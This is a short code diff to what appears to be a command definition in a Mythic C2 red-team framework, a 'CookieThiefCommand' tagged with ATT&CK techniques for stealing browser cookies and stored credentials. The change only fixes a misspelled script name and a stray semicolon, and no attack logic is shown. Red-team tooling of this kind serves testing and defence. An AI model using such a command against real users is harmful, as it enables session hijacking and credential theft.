@@ -47,10 +47,10 @@ class CookieThiefCommand(CommandBase):
     parameters = []
     attackmapping = ["T1539", "T1555"]
     argument_class = CookieThiefArguments
-    browser_script = BrowserScript(script_name="cookie_theif", author="@antman1p")
+    browser_script = BrowserScript(script_name="cookie_thief", author="@antman1p")
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        task.completed_callback_function = self.downloads_complete;
+        task.completed_callback_function = self.downloads_complete
         return task
 
     async def process_response(self, response: AgentResponse):
